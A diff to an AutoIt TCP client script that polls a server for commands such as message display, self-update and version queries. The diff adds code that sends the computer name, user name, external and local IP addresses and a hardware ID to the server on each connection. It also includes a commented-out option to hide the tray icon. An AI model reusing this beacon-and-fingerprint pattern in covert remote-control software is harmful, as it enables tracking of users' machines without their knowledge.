@@ -1,11 +1,12 @@
 ;TCP Client
-Global $Version = "1.1.0" ;package(server&client).features.fix
+Global $Version = "2.0.0" ;package(server&client).features.fix
 Global $LAN = True ; If the program running on the LAN (or WAN)
 
 #include <File.au3>
 #include <String.au3>
 #include <APIDiagConstants.au3>
 #include <WinAPIDiag.au3>
+#include <Inet.au3>
 
 ;Opt("TCPTimeout", 100)
 ;Opt("TrayIconHide", 1) ;Hide tray icon
@@ -31,6 +32,8 @@ Global $LAN = True ; If the program running on the LAN (or WAN)
 	Global $timerLastMSG
 ; Client Details
 	Global $clientUniqueHardwareID = _WinAPI_UniqueHardwareID($UHID_BIOS)
+
+	Global $clientInfo=@ComputerName&"|"&@UserName&"|"&_GetIP()&"|"&@IPAddress1&"-"&@IPAddress2&"|"&$clientUniqueHardwareID
 #EndRegion
 
 #Region ===== ===== DOWNLOAD / INTERNET / SETUP / STARTUP
@@ -88,7 +91,7 @@ EndFunc
 	While 1
 		_Recive()
 		If TimerDiff($timerLastMSG)>300000 Then _connect() ; Reconnect to server after 5 min
-		Sleep(100)
+		Sleep(10)
 
 
 	WEnd
@@ -98,17 +101,16 @@ EndFunc
 ;----- Commands
 	Func _commands($_command)
 		$_command=StringSplit($_command,"|")
+		_log('Command recived (#'&$_command[0]&')')
 		Switch $_command[1]
 			Case "server_offline"
 				_log('Server has gone offline, going to _connect after 5000ms')
 				Sleep(5000)
 				_connect()
-				Return
 
 			Case "msg"
 				_log('Command: MSG')
 				If $_command[0]>1 Then MsgBox(0,"Server Msg",$_command[2],5) ;<----- <----- <----- <----- Change from a msgbox to a gui
-				Return
 
 			Case "test"
 				_log('Command: test recived')
@@ -116,7 +118,32 @@ EndFunc
 			Case "update"
 				If FileExists($ProgUpdate) Then _UpdateExit()
 
+			Case "ask"
+				_log('Command: ask')
+				If $_command[0]>1 Then
+					If $_command[2]="" Then
+						_log('Nothing was asked')
+					Else
+						_log('asking: '&$_command[2])
+
+						Switch $_command[2]
+							Case "test"
+								_Send('Test Back')
+
+							Case "version"
+								_Send($Version)
+						EndSwitch
+
+					EndIf
+				EndIf
+
 		EndSwitch
+	EndFunc
+;----- Send
+	Func _Send($_sendMSG)
+		_log('Sending...')
+		$_send=TCPSend($Socket,$_sendMSG)
+		_log($_send&"|"&@error)
 	EndFunc
 ;----- Recive
 	Func _Recive()
@@ -136,11 +163,13 @@ EndFunc
 		_log("Looking for server (loop)")
 		$timerLooking=TimerInit()
 		Do
-			$Socket=TCPConnect($tcpIP,$tcpPORT)
-			If TimerDiff($timerLooking)>3600000 Then _Setup() ; if the server has not been found after 1 hour, download server details again.
 			Sleep(5000)
+			If TimerDiff($timerLooking)>3600000 Then _Setup() ; if the server has not been found after 1 hour, download server details again.
+			$Socket=TCPConnect($tcpIP,$tcpPORT)
 		Until $Socket <> -1
-		_log("Server Found!")
+		_log("Server Found! (Sending...)")
+		_log($clientInfo)
+		_Send($clientInfo)
 		$boolConnection=True
 		$timerLastMSG=TimerInit()
 	EndFunc
